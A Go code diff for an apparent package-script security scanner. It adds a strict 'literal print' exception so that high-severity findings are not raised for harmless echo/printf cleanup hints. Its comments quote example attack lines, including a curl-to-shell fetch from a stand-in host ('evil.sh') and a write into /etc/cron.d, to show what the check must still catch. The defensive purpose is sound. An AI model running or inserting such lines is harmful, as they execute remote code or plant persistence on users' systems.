@@ -125,9 +125,20 @@ func scanPatterns(content, file string) []Finding {
 			// — a cat/echo heredoc body or an echo/printf argument — are documentation,
 			// not executed code (e.g. a post_install note telling the user to run
 			// `systemctl enable …`). Suppress them so guidance isn't mistaken for a
-			// live-system action. Never applied to the critical/high block tier: that
-			// stays a hard wall regardless of where the payload hides.
-			if severityRank(p.severity) < 3 && isDisplayedText(line, loc[0], displayed) {
+			// live-system action.
+			rank := severityRank(p.severity)
+			if rank < 3 && isDisplayedText(line, loc[0], displayed) {
+				continue
+			}
+			// High (build-blocking) matches get a much narrower carve-out: only a line
+			// that is *entirely* `echo`/`printf` plus one quoted literal (isLiteralPrint)
+			// — a printed cleanup hint such as mullvad-vpn-bin's post_remove
+			// `echo 'rm ~/.config/autostart/mullvad-vpn.desktop'`. The loose
+			// isDisplayedText test is NOT enough at this tier: a heredoc body or a line
+			// that merely begins with `echo` can still pipe into `tee`/`crontab` or run a
+			// command substitution. Critical is never suppressed — it stays a hard wall
+			// regardless of where the payload hides.
+			if rank == 3 && isLiteralPrint(line) {
 				continue
 			}
 			if seen[line] {
@@ -219,6 +230,44 @@ func benignPkgdirContext(line string) bool {
 		return true
 	}
 	return strings.Contains(line, "pkgdir") || strings.Contains(line, "srcdir")
+}
+
+// literalPrintSingleRe matches a whole line that is nothing but `echo`/`printf`
+// applied to one single-quoted string: `  echo 'rm ~/.config/autostart/foo'`.
+// Inside single quotes the shell expands nothing at all — no variables, no command
+// substitution, no escapes — so the argument is inert text by construction. `[^']*`
+// is what makes the anchoring honest: a single quote cannot appear inside a
+// single-quoted word, so the run of non-quote bytes plus `'[ \t]*$` proves the
+// literal extends to end of line and nothing follows it to pipe, redirect, or chain.
+var literalPrintSingleRe = regexp.MustCompile(`^[ \t]*(?:echo|printf)[ \t]+'[^']*'[ \t]*$`)
+
+// literalPrintDoubleRe is the double-quoted counterpart. Double quotes DO expand,
+// so the character class is stricter: a backslash could escape the closing quote and
+// smuggle code past the end-anchor, and a backtick opens command substitution — both
+// are excluded outright. `$` is allowed (so `echo "rm $HOME/.config/autostart/x"`
+// qualifies) because a bare `$VAR`/`${VAR}` only interpolates a value; the executing
+// form `$(…)` is rejected separately in isLiteralPrint.
+var literalPrintDoubleRe = regexp.MustCompile("^[ \t]*(?:echo|printf)[ \t]+\"[^\"\\\\`]*\"[ \t]*$")
+
+// isLiteralPrint reports whether line is a *strictly* literal print: `echo` or
+// `printf` with exactly one quoted string argument and nothing else on the line.
+//
+// This is deliberately far narrower than printerCommand/isDisplayedText, because it
+// is the only suppression allowed to disarm a high-severity (build-blocking) finding.
+// printerCommand asks merely "does the line START with a printing command", which is
+// safe for advisory findings but not for a block: `echo 'x' | tee /etc/cron.d/y` and
+// `echo "$(curl http://evil.sh|sh)"` both start with `echo` yet write to the live
+// system / execute code. Requiring the quoted literal to run to end of line excludes
+// every such form — no pipe, redirect, `;`/`&&` chain, substitution, or second word
+// can survive the end-anchor. Motivating true positive-turned-false-positive:
+// mullvad-vpn-bin's post_remove prints `rm ~/.config/autostart/mullvad-vpn.desktop`
+// as a cleanup hint for the user, which read as an autostart write and hard-blocked.
+func isLiteralPrint(line string) bool {
+	if literalPrintSingleRe.MatchString(line) {
+		return true
+	}
+	// Double-quoted: reject command substitution, which executes rather than prints.
+	return literalPrintDoubleRe.MatchString(line) && !strings.Contains(line, "$(")
 }
 
 // heredocOpenerRe matches a heredoc redirection (`<<EOF`, `<<-EOF`, `<<'EOF'`),
